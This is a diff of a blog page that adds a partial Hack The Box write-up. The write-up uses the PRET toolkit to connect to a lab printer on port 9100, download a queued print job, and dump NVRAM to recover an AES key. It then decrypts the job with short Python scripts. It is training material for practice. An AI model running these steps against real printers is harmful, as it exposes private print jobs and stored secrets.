@@ -32,7 +32,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb68.jpg">
 <meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
 <meta property="article:published_time" content="2020-08-19T02:12:33.000Z">
-<meta property="article:modified_time" content="2020-08-19T02:37:21.418Z">
+<meta property="article:modified_time" content="2020-08-19T15:09:23.680Z">
 <meta property="article:author" content="lUc1f3r11">
 <meta property="article:tag" content="HackTheBox靶机练习">
 <meta name="twitter:card" content="summary">
@@ -229,7 +229,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-08-19 10:12:33 / Modified: 10:37:21" itemprop="dateCreated datePublished" datetime="2020-08-19T10:12:33+08:00">2020-08-19</time>
+              <time title="Created: 2020-08-19 10:12:33 / Modified: 23:09:23" itemprop="dateCreated datePublished" datetime="2020-08-19T10:12:33+08:00">2020-08-19</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -254,14 +254,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>219</span>
+              <span>4.3k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>1 mins.</span>
+              <span>4 mins.</span>
             </span>
 
         </div>
@@ -284,19 +284,43 @@
 <a id="more"></a>
 
 <h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">9000/tcp open  cslistener?</span><br><span class="line">9100/tcp open  jetdirect?</span><br></pre></td></tr></table></figure>
 
+<h3 id="port-9100"><a href="#port-9100" class="headerlink" title="port 9100"></a>port 9100</h3><p>After some searching we can see that HP jetdirect is a tcp/ip printer server. i found the following exploit/enumeration tool:</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1JVQi1ORFMvUFJFVA==">PRET<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>first download it</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/RUB-NDS/PRET.git</span><br></pre></td></tr></table></figure>
 
+<p>then</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/PRET<span class="comment"># python pret.py 10.10.10.201 pjl</span></span><br><span class="line">      ________________                                             </span><br><span class="line">    _/_______________/|                                            </span><br><span class="line">   /___________/___//||   PRET | Printer Exploitation Toolkit v0.40</span><br><span class="line">  |===        |----| ||    by Jens Mueller &lt;jens.a.mueller@rub.de&gt; </span><br><span class="line">  |           |   ô| ||                                            </span><br><span class="line">  |___________|   ô| ||                                            </span><br><span class="line">  | ||/.---.||    | ||      「 pentesting tool that made          </span><br><span class="line">  |-||/_____\||-.  | |         dumpster diving obsolete‥ 」       </span><br><span class="line">  |_||=L==H==||_|__|/                                              </span><br><span class="line">                                                                   </span><br><span class="line">     (ASCII art by                                                 </span><br><span class="line">     Jan Foerster)                                                 </span><br><span class="line">                                                                   </span><br><span class="line">Connection to 10.10.10.201 established</span><br><span class="line">Device:   LaserCorp LaserJet 4ML</span><br><span class="line"></span><br><span class="line">Welcome to the pret shell. Type <span class="built_in">help</span> or ? to list commands.</span><br><span class="line">10.10.10.201:/&gt;</span><br></pre></td></tr></table></figure>
 
+<p>now we have a connection, start some enumeration<br>with just a few linux commands we found a file named queued:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.201:/&gt; ls</span><br><span class="line">d        -   pjl</span><br><span class="line">10.10.10.201:/&gt; <span class="built_in">cd</span> pjl</span><br><span class="line">10.10.10.201:/pjl&gt; ls</span><br><span class="line">d        -   <span class="built_in">jobs</span></span><br><span class="line">10.10.10.201:/pjl&gt; <span class="built_in">cd</span> <span class="built_in">jobs</span></span><br><span class="line">10.10.10.201:/pjl/<span class="built_in">jobs</span>&gt; ls</span><br><span class="line">-   172199   queued</span><br></pre></td></tr></table></figure>
 
+<p>get queued</p>
+<p>and we downloaded the file to our machine, since this file is encrypted we still need a decryption key.</p>
+<p>nvram dump</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.201:/pjl/<span class="built_in">jobs</span>&gt; nvram dump</span><br><span class="line">Writing copy to nvram/10.10.10.201</span><br><span class="line">..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................k...e....y.....13u94r6..643rv19u</span><br></pre></td></tr></table></figure>
 
+<p>and we found our decryption key. lets try to decrypt this file:<br>convert file to base64.raw file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/PRET<span class="comment"># sed -e &quot;s#&#x27;##g&quot; queued | cut -c2- &gt; queued.b64</span></span><br><span class="line">root@kali:~/PRET<span class="comment"># ls</span></span><br><span class="line">capabilities.py   DISCLAIMER.md  helper.py   nvram          pjl.py          printer.pyc</span><br><span class="line">capabilities.pyc  discovery.py   helper.pyc  operators.py   pjl.pyc         queued</span><br><span class="line">codebook.py       discovery.pyc  img         operators.pyc  postscript.py   queued.b64</span><br><span class="line">codebook.pyc      fonts          LICENSE.md  overlays       postscript.pyc  README.md</span><br><span class="line">console.py        fuzzer.py      lpd         pcl.py         pret.py         testpages</span><br><span class="line">db                fuzzer.pyc     mibs        pcl.pyc        printer.py</span><br></pre></td></tr></table></figure>
 
+<p>decode file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">with open(<span class="string">&quot;queued.b64&quot;</span>,<span class="string">&quot;r&quot;</span>) as mmm:</span><br><span class="line">    mmm_content = mmm.read()</span><br><span class="line">    b85dec_content = base64.b85decode(mmm_content)</span><br><span class="line">    with open(<span class="string">&quot;secwalk.raw&quot;</span>,<span class="string">&quot;wb&quot;</span>) as mmm_jpg:</span><br><span class="line">        mmm_jpg.write(b85dec_content)</span><br></pre></td></tr></table></figure>
 
+<p>aes decrypt python script:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line">import io, sys, base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">with io.open(<span class="string">&#x27;secwalk.raw&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) as fp:</span><br><span class="line">    c = fp.read()[8:]</span><br><span class="line">    iv, ct = c[:16], c[16:]</span><br><span class="line">    cipher = AES.new(<span class="string">&#x27;13vu94r6643rv19u&#x27;</span>, AES.MODE_CBC, iv)</span><br><span class="line">    z = cipher.decrypt(ct)</span><br><span class="line">    sys.stdout.buffer.write(z)</span><br></pre></td></tr></table></figure>
 
+<p>then run it</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/PRET<span class="comment"># python3 aesde.py &gt; secwalk.pdf</span></span><br></pre></td></tr></table></figure>
 
+<p>and we get a pdf file:<br>the important contents are following:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="built_in">return</span> service_pb2.Data(feed=<span class="string">&#x27;Pushing feeds&#x27;</span>)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Here is how a sample feed information looks like.</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;v1.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Printer Feed&quot;</span>,</span><br><span class="line">    <span class="string">&quot;home_page_url&quot;</span>: <span class="string">&quot;http://printer.laserinternal.htb/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;feed_url&quot;</span>: <span class="string">&quot;http://printer.laserinternal.htb/feeds.json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;items&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">            <span class="string">&quot;content_text&quot;</span>: <span class="string">&quot;Queue jobs&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;content_text&quot;</span>: <span class="string">&quot;Failed items&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
-
+<p>now we know where port 9000 is used for.</p>
+<h3 id="Port-9000"><a href="#Port-9000" class="headerlink" title="Port 9000"></a>Port 9000</h3>
     </div>
 
     
@@ -452,7 +476,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#port-9100"><span class="nav-number">3.</span> <span class="nav-text">port 9100</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-9000"><span class="nav-number">4.</span> <span class="nav-text">Port 9000</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -549,7 +573,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">20:13</span>
+    <span title="Reading time total">20:17</span>
 </div>
   <div class="powered-by">Powered by <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly9tdXNlLnRoZW1lLW5leHQub3Jn">NexT.Muse</span>
   </div>
